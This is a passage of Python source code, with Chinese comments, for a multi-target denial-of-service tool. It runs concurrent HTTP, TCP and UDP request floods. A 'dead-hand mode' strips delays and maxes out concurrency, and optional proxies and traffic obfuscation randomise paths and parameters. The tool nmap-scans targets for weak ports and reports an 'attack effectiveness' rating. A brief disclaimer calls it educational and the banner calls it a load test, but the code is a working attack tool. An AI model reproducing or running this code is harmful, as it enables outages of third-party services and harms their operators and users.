            # 不再主动刷新总体进度条，让它在后台统计
            # 只刷新各目标的进度条
            for pbar in self.progress_bars.values() if self.progress_bars else []:
                # 只有在死手模式下才显示进度条
                if self.deadhand_mode:
                    pbar.refresh()

            # 获取当前网络状态
            try:
                network_io = psutil.net_io_counters()
                current_time = time.time()

                # 计算当前速度
                bytes_sent_diff = network_io.bytes_sent - prev_sent_bytes
                time_diff = current_time - prev_time
                current_speed = bytes_sent_diff / time_diff if time_diff > 0 else 0

                # 更新历史记录
                self.network_stats['last_bytes_sent'] = network_io.bytes_sent
                self.network_stats['current_speed'] = current_speed
                self.network_stats['speed_history'].append(current_speed)
                if len(self.network_stats['speed_history']) > 10:
                    self.network_stats['speed_history'].pop(0)

                # 更新峰值速度
                if current_speed > self.network_stats['peak_speed']:
                    self.network_stats['peak_speed'] = current_speed

                # 动态调整并发
                if self.dynamic_concurrency:
                    # 如果速度下降，增加并发
                    avg_speed = sum(self.network_stats['speed_history']) / len(self.network_stats['speed_history']) if \
                    self.network_stats['speed_history'] else 0

                    # 简单的自适应算法
                    if current_speed < avg_speed * 0.8 and self.concurrency < self.max_concurrency:
                        new_concurrency = min(self.concurrency + 10, self.max_concurrency)
                        if new_concurrency != self.concurrency:
                            self.concurrency = new_concurrency
                            print(Fore.CYAN + f"\n[网络优化] 增加并发至 {self.concurrency} 以提高带宽利用")

                    # 如果CPU使用率过高，减少并发
                    if psutil.cpu_percent(interval=None) > 90:
                        new_concurrency = max(self.concurrency - 5, 10)
                        if new_concurrency != self.concurrency:
                            self.concurrency = new_concurrency
                            print(Fore.CYAN + f"\n[系统优化] 降低并发至 {self.concurrency} 以减轻CPU负担")

                # 更新上一次的数据
                prev_sent_bytes = network_io.bytes_sent
                prev_recv_bytes = network_io.bytes_recv
                prev_time = current_time
                prev_request_count = self.request_count
                prev_success_count = self.success_count
            except Exception as e:
                logger.debug(f"网络监控异常: {str(e)}")

    async def _attack_http(self):
        # 使用自定义的SSL上下文
        connector = aiohttp.TCPConnector(
            verify_ssl=False,
            ssl=ssl.create_default_context(),
            limit=self.concurrency * len(self.targets),  # 增加连接池大小
            ttl_dns_cache=300,  # DNS缓存时间
            keepalive_timeout=60,
            enable_cleanup_closed=True
        )

        # 创建更有效的超时设置
        timeout = aiohttp.ClientTimeout(
            total=self.timeout,
            connect=min(5, self.timeout / 2),  # 降低连接超时以更快重试
            sock_connect=min(5, self.timeout / 2),
            sock_read=self.timeout
        )

        # 显示攻击开始信息
        print(Fore.CYAN + "\n开始HTTP攻击...")
        print(Fore.YELLOW + "攻击进行中，请等待或按Ctrl+C停止...\n")

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 初始化进度统计，但不显示
            self.progress_bars = {}
            for target in self.targets:
                self.progress_bars[target] = tqdm(
                    desc=f"{Fore.CYAN}HTTP {target[:30]}",
                    unit="req",
                    leave=True,
                    bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]",
                    ncols=100,
                    colour='green',
                    mininterval=1.0,  # 最小刷新间隔设为1秒
                    disable=not self.deadhand_mode  # 非死手模式禁用显示
                )

            # 初始化总体进度计数，但不显示
            self.main_progress = tqdm(
                total=0,  # 动态更新
                desc=f"{Fore.YELLOW}总攻击进度",
                unit="req",
                leave=True,
                position=0,
                bar_format="{desc} | {n_fmt} 请求 | {elapsed} 已用时间 | {rate_fmt}",
                ncols=100,
                colour='blue',
                mininterval=0.5,  # 最小刷新间隔设为0.5秒
                disable=True  # 禁用显示
            )

            tasks = []
            for target in self.targets:
                # 根据并发度动态创建worker
                for _ in range(self.concurrency):
                    task = asyncio.create_task(self._http_worker(session, target, self.progress_bars[target]))
                    tasks.append(task)
                    self.tasks.append(task)  # 存储任务引用

            try:
                await asyncio.gather(*tasks)
            except asyncio.CancelledError:
                pass
            finally:
                for pbar in self.progress_bars.values():
                    pbar.close()
                if self.main_progress:
                    self.main_progress.close()

    async def _http_worker(self, session, target, pbar):
        while not self.should_stop.is_set():  # 使用事件检查
            if await self._send_http_request(session, target):
                # 只在死手模式下才更新目标进度条显示
                if self.deadhand_mode:
                    pbar.update(1)
                # 总进度计数器仍然累加，但不显示
                self.main_progress.update(1)

                # 不再更新成功率描述

            # 死手模式下无延迟，增加并发
            if not self.deadhand_mode:
                await asyncio.sleep(0.001)  # 使用非常小的延迟，提高吞吐量

    async def _attack_tcp(self):
        # 显示攻击开始信息
        print(Fore.CYAN + "\n开始TCP攻击...")
        print(Fore.YELLOW + "攻击进行中，请等待或按Ctrl+C停止...\n")

        # 初始化进度统计，但不显示
        self.progress_bars = {}
        for target in self.targets:
            self.progress_bars[target] = tqdm(
                desc=f"{Fore.CYAN}TCP {target[:30]}",
                unit="req",
                leave=True,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]",
                ncols=100,
                colour='green',
                mininterval=1.0,  # 最小刷新间隔设为1秒
                disable=not self.deadhand_mode  # 非死手模式禁用显示
            )

        # 初始化总体进度计数，但不显示
        self.main_progress = tqdm(
            total=0,  # 动态更新
            desc=f"{Fore.YELLOW}总攻击进度",
            unit="req",
            leave=True,
            position=0,
            bar_format="{desc} | {n_fmt} 请求 | {elapsed} 已用时间 | {rate_fmt}",
            ncols=100,
            colour='blue',
            mininterval=0.5,  # 最小刷新间隔设为0.5秒
            disable=True  # 禁用显示
        )

        tasks = []
        for target in self.targets:
            # 根据并发度动态创建worker
            for _ in range(self.concurrency):
                task = asyncio.create_task(self._tcp_worker(target, self.progress_bars[target]))
                tasks.append(task)
                self.tasks.append(task)  # 存储任务引用

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            for pbar in self.progress_bars.values():
                pbar.close()
            if self.main_progress:
                self.main_progress.close()

    async def _tcp_worker(self, target, pbar):
        loop = asyncio.get_event_loop()
        while not self.should_stop.is_set():  # 使用事件检查
            result = await loop.run_in_executor(self.executor, self._sync_tcp_request, target)
            if result:
                # 只在死手模式下才更新目标进度条显示
                if self.deadhand_mode:
                    pbar.update(1)
                # 总进度计数器仍然累加，但不显示
                self.main_progress.update(1)

                # 不再更新成功率描述

            # 死手模式下无延迟
            if not self.deadhand_mode:
                await asyncio.sleep(0.001)  # 使用非常小的延迟，提高吞吐量

    async def _attack_udp(self):
        # 显示攻击开始信息
        print(Fore.CYAN + "\n开始UDP攻击...")
        print(Fore.YELLOW + "攻击进行中，请等待或按Ctrl+C停止...\n")

        # 初始化进度统计，但不显示
        self.progress_bars = {}
        for target in self.targets:
            self.progress_bars[target] = tqdm(
                desc=f"{Fore.CYAN}UDP {target[:30]}",
                unit="req",
                leave=True,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]",
                ncols=100,
                colour='green',
                mininterval=1.0,  # 最小刷新间隔设为1秒
                disable=not self.deadhand_mode  # 非死手模式禁用显示
            )

        # 初始化总体进度计数，但不显示
        self.main_progress = tqdm(
            total=0,  # 动态更新
            desc=f"{Fore.YELLOW}总攻击进度",
            unit="req",
            leave=True,
            position=0,
            bar_format="{desc} | {n_fmt} 请求 | {elapsed} 已用时间 | {rate_fmt}",
            ncols=100,
            colour='blue',
            mininterval=0.5,  # 最小刷新间隔设为0.5秒
            disable=True  # 禁用显示
        )

        tasks = []
        for target in self.targets:
            # 根据并发度动态创建worker
            for _ in range(self.concurrency):
                task = asyncio.create_task(self._udp_worker(target, self.progress_bars[target]))
                tasks.append(task)
                self.tasks.append(task)  # 存储任务引用

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            for pbar in self.progress_bars.values():
                pbar.close()
            if self.main_progress:
                self.main_progress.close()

    async def _udp_worker(self, target, pbar):
        loop = asyncio.get_event_loop()
        while not self.should_stop.is_set():  # 使用事件检查
            result = await loop.run_in_executor(self.executor, self._sync_udp_request, target)
            if result:
                # 只在死手模式下才更新目标进度条显示
                if self.deadhand_mode:
                    pbar.update(1)
                # 总进度计数器仍然累加，但不显示
                self.main_progress.update(1)

                # 不再更新成功率描述

            # 死手模式下无延迟
            if not self.deadhand_mode:
                await asyncio.sleep(0.001)  # 使用非常小的延迟，提高吞吐量

    def stop_attack(self):
        if self.should_stop.is_set():  # 防止重复停止
            return

        logger.info("正在停止攻击...")
        print(Fore.RED + "\n正在停止攻击，请稍等...")
        self.should_stop.set()  # 设置停止事件
        self.end_time = time.time()

        # 尝试取消所有任务
        if self.loop and self.tasks:
            for task in self.tasks:
                if not task.done():
                    task.cancel()

        # 关闭并清理进度条
        for pbar in self.progress_bars.values() if self.progress_bars else []:
            pbar.close()
        if self.main_progress:
            self.main_progress.close()

        print(Fore.RED + "攻击被停止...")
        logger.info("攻击已停止")

        # 清理资源
        self._cleanup_resources()

        # 显示攻击统计
        self.display_attack_statistics()

    def _cleanup_resources(self):
        """清理所有资源，释放内存"""
        logger.info("开始清理资源...")
        print(Fore.YELLOW + "\n正在清理资源...")

        # 关闭所有套接字连接
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()

        # 清空大型数据结构
        if hasattr(self, 'attack_data_packets'):
            self.attack_data_packets.clear()

        # 清空网络统计数据
        self.network_stats['speed_history'].clear()

        # 关闭线程池
        if hasattr(self, 'executor'):
            self.executor.shutdown(wait=False)

        # 强制垃圾回收
        gc.collect()

        # 显示内存使用情况
        memory_before = psutil.virtual_memory().percent

        # 再次强制垃圾回收
        gc.collect()
        gc.collect()

        memory_after = psutil.virtual_memory().percent
        logger.info(f"内存清理完成: {memory_before}% -> {memory_after}%")
        print(Fore.GREEN + f"内存清理完成: {memory_before}% -> {memory_after}%")

    def start(self):
        try:
            # 检查是否有有效目标
            if not self.targets:
                logger.error("没有有效的攻击目标，无法启动攻击")
                print(Fore.RED + "错误: 没有有效的攻击目标，无法启动攻击!")
                return

            # 检查协议是否有效
            if self.protocol.lower() not in ["http", "tcp", "udp"]:
                logger.error(f"不支持的协议: {self.protocol}")
                print(Fore.RED + f"错误: 不支持的协议: {self.protocol}. 请使用 http, tcp 或 udp.")
                return

            # 显示攻击准备中提示
            print(Fore.CYAN + "\n" + "=" * 60)
            print(Fore.YELLOW + "攻击初始化中，请稍候...")
            print(Fore.CYAN + "=" * 60)

            # 设置系统优化
            self._optimize_system()

            self.start_time = time.time()
            self.should_stop.clear()  # 重置停止事件
            self.loop = asyncio.new_event_loop()

            # 优化事件循环策略
            if hasattr(asyncio, 'WindowsSelectorEventLoopPolicy') and platform.system() == 'Windows':
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

            asyncio.set_event_loop(self.loop)

            # 设置信号处理
            if threading.current_thread() is threading.main_thread():
                # 直接设置停止函数而不是通过间接调用
                def signal_handler(sig, frame):
                    self.stop_attack()

                if platform.system() != 'Windows':
                    self.loop.add_signal_handler(signal.SIGINT, self.stop_attack)
                else:
                    # Windows系统特定的信号处理
                    signal.signal(signal.SIGINT, signal_handler)

            if self.duration is not None:
                logger.info(f"攻击将在 {self.duration} 秒后自动停止")
                print(Fore.YELLOW + f"攻击将在 {self.duration} 秒后自动停止...")

            # 启动网络监控线程
            self.network_monitor_thread = threading.Thread(target=self._monitor_network_performance)
            self.network_monitor_thread.daemon = True
            self.network_monitor_thread.start()
            self.threads.append(self.network_monitor_thread)

            # 启动定期状态打印线程
            def print_status_periodically():
                start_time = time.time()
                last_print = 0
                while not self.should_stop.is_set():
                    now = time.time()
                    # 每10秒打印一次状态
                    if now - last_print >= 10:
                        elapsed = now - start_time
                        total_requests = self.successful_requests + self.failed_requests
                        if total_requests > 0:
                            success_rate = (self.successful_requests / total_requests) * 100
                            req_per_sec = total_requests / elapsed if elapsed > 0 else 0
                            data_sent_mb = self.total_data_sent / (1024 * 1024)

                            # 简短状态信息
                            status = f"[{elapsed:.1f}秒] 已发送: {total_requests} 请求 | 速率: {req_per_sec:.2f} req/s | 成功率: {success_rate:.1f}%"
                            print(Fore.CYAN + status)

                        last_print = now
                    time.sleep(1)

            status_thread = threading.Thread(target=print_status_periodically)
            status_thread.daemon = True
            status_thread.start()
            self.threads.append(status_thread)

            # 提示攻击准备就绪
            print(Fore.YELLOW + "\n" + "=" * 60)
            print(Fore.GREEN + " 攻击准备就绪，开始执行...")
            print(Fore.YELLOW + "=" * 60 + "\n")

            # 根据协议选择攻击方式
            protocol = self.protocol.lower()
            if protocol == "http":
                logger.info("开始HTTP攻击")
                print(Fore.CYAN + "正在启动HTTP攻击...")
                self.loop.run_until_complete(self._attack_http())
            elif protocol == "tcp":
                logger.info("开始TCP攻击")
                print(Fore.CYAN + "正在启动TCP攻击...")
                self.loop.run_until_complete(self._attack_tcp())
            elif protocol == "udp":
                logger.info("开始UDP攻击")
                print(Fore.CYAN + "正在启动UDP攻击...")
                self.loop.run_until_complete(self._attack_udp())
            else:
                error_msg = f"不支持的协议: {self.protocol}"
                logger.error(error_msg)
                print(Fore.RED + error_msg)
        except KeyboardInterrupt:
            self.stop_attack()
            logger.info("用户中断攻击")
            print(Fore.RED + "\n用户中断攻击，正在停止...")
        except asyncio.CancelledError:
            self.stop_attack()
            logger.info("任务被取消")
            print(Fore.RED + "\n任务被取消，正在停止...")
        except Exception as e:
            error_msg = f"攻击过程中发生错误: {str(e)}"
            logger.error(error_msg, exc_info=True)
            print(Fore.RED + error_msg)
            # 打印详细的错误信息，帮助调试
            import traceback
            traceback_str = traceback.format_exc()
            logger.error(f"详细错误信息:\n{traceback_str}")
            print(Fore.RED + "发生错误，攻击将被停止")
            self.stop_attack()
        finally:
            # 取消所有任务并关闭事件循环
            try:
                if self.loop:
                    remaining_tasks = asyncio.all_tasks(self.loop)
                    if remaining_tasks:
                        for task in remaining_tasks:
                            task.cancel()
                        # 强制等待所有任务取消
                        self.loop.run_until_complete(asyncio.gather(*remaining_tasks, return_exceptions=True))
                    self.loop.close()
            except Exception as e:
                error_msg = f"清理过程中发生错误: {str(e)}"
                logger.error(error_msg, exc_info=True)
                print(Fore.RED + error_msg)

            # 关闭线程池
            if hasattr(self, 'executor'):
                self.executor.shutdown(wait=False)

            # 清理资源
            self._cleanup_resources()

            self.display_attack_statistics()

    def _optimize_system(self):
        """优化系统设置以提高网络性能"""
        try:
            print(Fore.GREEN + "正在优化系统设置以提高攻击效率...")

            # 提高套接字限制(仅限Linux/Mac)
            if platform.system() != 'Windows':
                # 尝试设置更高的文件描述符限制
                import resource
                soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
                try:
                    # 提高打开文件数限制
                    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
                    print(Fore.GREEN + f"文件描述符限制已提高: {soft} -> {hard}")
                except Exception:
                    pass

            # Windows特定优化
            if platform.system() == 'Windows':
                # 检查是否有管理员权限
                if is_admin():
                    try:
                        # 可以在这里添加Windows特定的网络优化命令
                        # 例如调整TCP参数等
                        os.system('netsh int tcp set global autotuninglevel=normal')
                        # 移除不支持的chimney参数
                        os.system('netsh int tcp set global rss=enabled')

                        # 死手模式特殊优化
                        if self.deadhand_mode:
                            # 最大化TCP连接参数
                            os.system('netsh int tcp set global maxsynretransmissions=2')
                            os.system('netsh int tcp set global initialRto=1000')
                            os.system('netsh int tcp set global ecncapability=disabled')
                            # 添加更多性能优化
                            os.system('netsh int tcp set global fastopen=enabled')
                            os.system('netsh int tcp set global timestamps=disabled')
                            os.system('netsh int tcp set global nonsackrttresiliency=disabled')
                            # 设置最低延迟
                            if is_admin():
                                try:
                                    # 设置网络优先级
                                    os.system('wmic process where name="python.exe" CALL setpriority "high priority"')
                                except:
                                    pass

                        print(Fore.GREEN + "Windows网络参数已优化")
                    except Exception as e:
                        print(Fore.YELLOW + f"网络参数优化警告: {str(e)}")
                else:
                    print(Fore.YELLOW + "需要管理员权限以进行完全优化")

            # 动态调整并发度
            cpu_count = multiprocessing.cpu_count()
            ram_gb = psutil.virtual_memory().total / (1024 ** 3)

            # 根据系统资源动态调整最大并发数
            if self.deadhand_mode:
                # 死手模式下设置极高的并发数
                self.max_concurrency = int(min(cpu_count * 100, ram_gb * 50))
                print(Fore.RED + f"死手模式已启用: 最大并发数设置为 {self.max_concurrency}")
            else:
                suggested_concurrency = int(min(cpu_count * 25, ram_gb * 10))
                if suggested_concurrency > self.concurrency:
                    self.max_concurrency = suggested_concurrency
                    print(Fore.GREEN + f"系统资源检测: CPU核心数={cpu_count}, RAM={ram_gb:.1f}GB")
                    print(Fore.GREEN + f"最大并发数已优化为: {self.max_concurrency}")

        except Exception as e:
            print(Fore.YELLOW + f"系统优化过程中出现警告: {str(e)}")

    def display_attack_statistics(self):
        """显示攻击统计信息"""

        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.GREEN + " 攻击统计信息 ".center(58))
        print(Fore.CYAN + "=" * 60)

        # 确保有开始时间和攻击数据
        if not self.start_time:
            print(Fore.RED + "错误: 无法获取攻击统计信息，可能攻击未开始或已重置")
            return

        # 当前时间作为结束时间
        self.end_time = self.end_time or time.time()

        # 计算攻击持续时间
        duration = self.end_time - self.start_time
        hours, remainder = divmod(duration, 3600)
        minutes, seconds = divmod(remainder, 60)

        # 格式化时间
        duration_str = ""
        if hours:
            duration_str += f"{int(hours)}小时 "
        if minutes:
            duration_str += f"{int(minutes)}分钟 "
        duration_str += f"{seconds:.2f}秒"

        # 计算请求总数和成功率
        total_requests = self.successful_requests + self.failed_requests
        if total_requests > 0:
            success_rate = (self.successful_requests / total_requests) * 100

            # 攻击效率指标
            avg_speed = total_requests / duration if duration > 0 else 0
            data_sent_mb = self.total_data_sent / (1024 * 1024)
            bandwidth_used_mbps = (self.total_data_sent * 8) / (1024 * 1024 * duration) if duration > 0 else 0

            # 输出统计信息
            stats = []
            stats.append(f"[攻击持续时间]: {duration_str}")
            stats.append(f"[总请求数]: {total_requests}")
            stats.append(f"[成功请求]: {self.successful_requests}")
            stats.append(f"[失败请求]: {self.failed_requests}")

            # 成功率计算
            success_rate = (self.successful_requests / total_requests) * 100
            stats.append(f"[成功率]: {success_rate:.2f}%")

            stats.append(f"[平均速度]: {avg_speed:.2f} req/s")
            stats.append(f"[已发送数据]: {data_sent_mb:.2f} MB")
            stats.append(f"[带宽使用]: {bandwidth_used_mbps:.2f} Mbps")

            # 打印统计数据
            for stat in stats:
                print(Fore.YELLOW + stat)

            # 根据成功率和速度评估攻击效果
            effectiveness = ""
            if success_rate > 95:
                effectiveness = "极佳"
            elif success_rate > 80:
                effectiveness = "良好"
            elif success_rate > 50:
                effectiveness = "一般"
            else:
                effectiveness = "较差"

            if avg_speed > 100:
                effectiveness += " (高吞吐量)"
            elif avg_speed < 10:
                effectiveness += " (低吞吐量)"

            print(Fore.GREEN + f"\n[攻击效果评估]: {effectiveness}")
        else:
            print(Fore.RED + "没有发送任何请求，无法生成统计信息")

        print(Fore.CYAN + "=" * 60)


class OperationConsole:
    CONFIG_FILE = "DDoSData.config"

    @staticmethod
    def show_deadhand_warning():
        """显示死手模式警告对话框"""
        try:
            # 创建一个隐藏的根窗口
            root = tk.Tk()
            root.withdraw()

            # 显示警告消息
            warning_message = """[!] 危险操作警告 [!]

死手模式将尽可能使用您计算机的所有资源来攻击目标。

这可能导致:
1. 您的计算机过热或变得无响应
2. 网络连接饱和，可能影响您的互联网服务提供商
3. 可能触发防火墙或安全系统的警报
4. 在某些地区可能违反法律

此模式仅供教育和授权渗透测试使用。------BrodyRichardson

您确定要继续吗？"""

            result = messagebox.askokcancel("[!] 死手模式警告", warning_message, icon='warning')

            # 销毁根窗口
            root.destroy()

            return result
        except Exception as e:
            print(Fore.RED + f"无法显示图形界面警告: {str(e)}")
            # 如果无法显示图形界面，则回退到控制台警告
            print(Fore.RED + "\n" + "!" * 60)
            print(Fore.RED + "[!] 危险操作警告 - 死手模式 [!]")
            print(Fore.RED + "!" * 60)
            print(Fore.RED + "死手模式将尽可能使用您计算机的所有资源来攻击目标。")
            print(Fore.RED + "这可能导致您的计算机过热或变得无响应。")
            print(Fore.RED + "在某些地区可能违反法律。仅供教育和授权渗透测试使用。")
            response = input(Fore.RED + "您确定要继续吗？(yes/no): ").strip().lower()
            return response == 'yes'

    @staticmethod
    def _scan_target_ports(target):
        """扫描目标服务器开放的端口"""
        # 确保target不为None且为有效字符串
        if target is None or not isinstance(target, str) or not target.strip():
            print(Fore.RED + "错误: 无效的扫描目标")
            return []

        # 检查nmap模块是否已成功导入
        try:
            import nmap
        except ImportError:
            print(Fore.RED + "nmap模块未安装或导入失败，将跳过端口扫描")
            return []

        nm = nmap.PortScanner()
        print(Fore.CYAN + f"正在扫描目标 {target} 的端口...")

        # 常见服务端口
        common_ports = [80, 443, 21, 22, 23, 25, 53, 110, 135, 139, 143, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]

        try:
            # 仅扫描 TCP 端口以加快速度
            nm.scan(hosts=target, arguments=f'-p {",".join(map(str, common_ports))}')

            # 存储端口扫描结果
            port_info = []

            for host in nm.all_hosts():
                for port in nm[host].all_tcp():
                    port_data = nm[host]['tcp'][port]
                    service = port_data['name']
                    product = port_data['product']
                    version = port_data['version']

                    # 根据服务信息评估风险等级
                    risk_score = OperationConsole._assess_service_risk(service, product, version)

                    port_info.append({
                        'port': port,
                        'service': service,
                        'product': product,
                        'version': version,
                        'risk_score': risk_score
                    })

            # 按照风险等级排序
            port_info.sort(key=lambda x: x['risk_score'], reverse=True)

            print(Fore.CYAN + "端口扫描结果:")
            for info in port_info:
                print(
                    Fore.CYAN + f"  端口 {info['port']}: {info['service']} {info['product']} {info['version']} 风险评分: {info['risk_score']}")

            # 返回风险最高的前3个端口
            return [str(info['port']) for info in port_info[:3]]
        except Exception as e:
            error_message = str(e)
            print(Fore.RED + f"端口扫描出错: {error_message}")

            # 检查特定的错误类型
            if "nmap program was not found in path" in error_message:
                print(Fore.YELLOW + "nmap程序未找到，您可能需要安装nmap或将其添加到系统路径")
                print(Fore.YELLOW + "您可以从以下网址下载nmap: https://nmap.org/dist/nmap-7.95-setup.exe")
                print(Fore.YELLOW + "或者手动运行: pip install python-nmap")

            # 跳过端口扫描
            return []

    @staticmethod
    def _assess_service_risk(service, product, version):
        """根据服务信息评估风险等级"""
        # 此处可以根据实际情况定制风险评估规则
        # 参考因素: 服务类型、版本号、已知漏洞等

        # 示例规则:
        if service == 'http' and 'apache' in product.lower() and version.startswith('2.2'):
            # Apache 2.2.x 版本存在多个高危漏洞
            return 5
        elif service == 'ftp' and 'vsftpd' in product.lower() and version.startswith('2.3.4'):
            # vsftpd 2.3.4 后门事件
            return 5
        elif service == 'telnet':
            # Telnet 明文传输风险大
            return 4
        elif service in ['mysql', 'redis', 'mongodb']:
            # 数据库服务通常包含敏感信息
            return 3
        else:
            # 其他服务默认风险评分为 2
            return 2

    @staticmethod
    def config():
        if os.path.exists(OperationConsole.CONFIG_FILE):
            use_last = input(Fore.GREEN + "使用上次配置？(y/N): ").strip().lower()
            if use_last == 'y':
                with open(OperationConsole.CONFIG_FILE, 'r', encoding='utf-8') as f:
                    saved = json.load(f)
                    return saved['targets'], saved['targets_ports'], saved['config']

        print(Fore.CYAN + "=== 高并发负载测试系统 ===Made by Brody R.")
        targets = OperationConsole._input_targets()
        protocol = input(Fore.GREEN + "协议 (http/tcp/udp): ").strip().lower()

        # 代理设置
        proxies = None
        use_proxy = input(Fore.GREEN + "使用代理？(y/N): ").strip().lower() == 'y'
        if use_proxy:
            proxy_count = int(input(Fore.GREEN + "代理数量: ") or 1)
            proxies = []
            print(Fore.YELLOW + "请输入代理地址 (格式: socks5://user:pass@host:port 或 http://host:port):")
            for i in range(proxy_count):
                proxy = input(f"{Fore.GREEN}代理 {i + 1}: ").strip()
                if proxy:
                    proxies.append(proxy)

        # 攻击持续时间设置
        duration_input = input(Fore.GREEN + "攻击持续时间（秒，留空表示无限制）: ").strip()
        duration = int(duration_input) if duration_input and duration_input.isdigit() else None

        if duration is not None and duration <= 0:
            print(Fore.YELLOW + "攻击持续时间必须大于0，设置为无限制")
            duration = None

        # 流量混淆设置
        obfuscation = input(Fore.GREEN + "启用高级流量混淆? (y/N): ").strip().lower() == 'y'

        # 死手模式设置
        deadhand_mode = False
        if input(Fore.RED + "启用死手模式？(y/N): ").strip().lower() == 'y':
            # 显示警告对话框
            if OperationConsole.show_deadhand_warning():
                deadhand_mode = True
                print(Fore.RED + "死手模式已激活！系统将使用全部资源进行攻击！")
            else:
                print(Fore.GREEN + "已取消死手模式")

        # 检查nmap端口扫描功能是否可用
        port_scan_available = True
        try:
            import nmap
        except ImportError:
            port_scan_available = False
            print(Fore.YELLOW + "nmap模块未安装，将跳过端口扫描")

        # 扫描目标端口
        targets_ports = {}
        if port_scan_available:
            print(Fore.CYAN + "开始扫描目标端口...")
            for target in targets:
                # 提取 IP 或域名
                parsed_target = urllib.parse.urlparse(target)
                hostname = parsed_target.hostname

                # 检查hostname是否为None，如果是，则尝试使用原始target
                if hostname is None:
                    # 如果URL解析失败，尝试直接使用target作为主机名
                    print(Fore.YELLOW + f"警告: 无法从 {target} 解析出主机名，将直接使用目标地址")
                    hostname = target
                    # 如果目标包含协议前缀，移除它
                    if '://' in hostname:
                        hostname = hostname.split('://', 1)[1].split('/', 1)[0].split(':', 1)[0]

                # 扫描端口
                weak_ports = OperationConsole._scan_target_ports(hostname)
                targets_ports[target] = weak_ports
        else:
            # 如果端口扫描不可用，为每个目标设置一个空列表
            for target in targets:
                targets_ports[target] = []
            print(Fore.YELLOW + "端口扫描功能不可用，将使用默认配置")

        # 基本配置的修改，增加高级选项
        config = {
            'request_size': int(input(Fore.GREEN + "请求大小 (默认 1024): ") or 1024),
            'concurrency': int(input(Fore.GREEN + "并发数 (默认 100): ") or 100),
            'timeout': int(input(Fore.GREEN + "超时 (秒，默认 30): ") or 30),
            'protocol': protocol,
            'proxies': proxies,
            'duration': duration,
            'obfuscation': obfuscation,
            'enable_random_delay': obfuscation,
            'enable_path_randomization': obfuscation,
            'enable_param_randomization': obfuscation,
            'dynamic_concurrency': True,  # 默认启用动态并发调整
            'deadhand_mode': deadhand_mode  # 死手模式设置
        }

        # 询问高级性能设置 (非死手模式下才询问)
        if not deadhand_mode and input(Fore.GREEN + "配置高级性能设置? (y/N): ").strip().lower() == 'y':
            print(Fore.CYAN + "\n高级性能设置:")
            config['dynamic_concurrency'] = input(Fore.GREEN + "  启用动态并发调整? (Y/n): ").strip().lower() != 'n'
            max_concurrency = input(Fore.GREEN + f"  最大并发数 (默认 {config['concurrency'] * 2}): ").strip()
            if max_concurrency and max_concurrency.isdigit():
                config['max_concurrency'] = int(max_concurrency)
            else:
                config['max_concurrency'] = config['concurrency'] * 2

        with open(OperationConsole.CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump({'targets': targets, 'targets_ports': targets_ports, 'config': config}, f, ensure_ascii=False)
        return targets, targets_ports, config

    @staticmethod
    def _input_targets():
        targets = []
        while True:
            target = input(Fore.YELLOW + f"目标 {len(targets) + 1} (IP/可解析的域名): ").strip()
            if not target:
                if targets: break
                continue

            # 如果输入的是网址,尝试解析IP
            if not target.replace('.', '').isdigit():
                print(Fore.CYAN + f"正在解析域名: {target}")

                # 尝试从URL中提取纯域名
                try:
                    parsed_url = urllib.parse.urlparse(target)
                    domain = parsed_url.netloc
                    if not domain:
                        domain = parsed_url.path.split('/')[0]
                    print(Fore.CYAN + f"提取域名: {domain}")
                    target = domain
                except Exception as e:
                    error_msg = f"提取域名失败: {target}, 错误信息: {str(e)}"
                    logger.error(error_msg)
                    print(Fore.RED + error_msg)

                MAX_RETRY = 3
                retry = 0
                while retry < MAX_RETRY:
                    try:
                        ip = socket.gethostbyname(target)
                        print(Fore.GREEN + f"解析结果: {ip}")
                        confirm = input(Fore.YELLOW + f"是否锁定此IP: {ip}? (y/N): ").strip().lower()
                        if confirm == 'y':
                            target = ip
                            targets.append(target)
                            print(Fore.GREEN + f"已锁定目标: {target}, 继续攻击请直接回车")
                            break
                        else:
                            target = ip
                        break  # 解析成功,跳出重试循环
                    except socket.gaierror as e:
                        retry += 1
                        fail_msg = f"域名解析失败: {target}, 错误信息: {str(e)}, 重试: {retry}/{MAX_RETRY}"
                        logger.warning(fail_msg, exc_info=True)
                        print(Fore.YELLOW + fail_msg)

                        if retry == MAX_RETRY:
                            fail_msg = f"域名解析失败: {target}, 重试{MAX_RETRY}次后仍失败"
                            logger.error(fail_msg, exc_info=True)
                            print(Fore.RED + fail_msg)

                            choice = input(
                                Fore.YELLOW + "请检查网络连接,或直接输入IP。是否跳过这个目标? (y/N): ").strip().lower()
                            if choice == 'y':
                                print(Fore.YELLOW + f"已跳过目标: {target}")
                                break
                            else:
                                retry = 0  # 用户选择不跳过,重置重试次数
                        else:
                            time.sleep(1)  # 等待1秒后重试
                else:
                    # 达到最大重试次数,自动跳过这个目标
                    fail_msg = f"域名解析失败: {target}, 重试{MAX_RETRY}次后仍失败, 自动跳过此目标"
                    logger.error(fail_msg, exc_info=True)
                    print(Fore.RED + fail_msg)
                    continue

            if '://' not in target: target = f'http://{target}'
            targets.append(target)
        return targets


if __name__ == "__main__":
    logger.info("程序启动")
    print(Fore.CYAN + """
██████╗░██████╗░░█████╗░░██████╗  ████████╗███████╗░██████╗████████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
██║░░██║██║░░██║██║░░██║╚█████╗░  ░░░██║░░░█████╗░░╚█████╗░░░░██║░░░
██║░░██║██║░░██║██║░░██║╚█████╗░  ░░░██║░░░█████╗░░╚█████╗░░░░██║░░░
██████╔╝██████╔╝╚█████╔╝██████╔╝  ░░░██║░░░███████╗██████╔╝░░░██║░░░
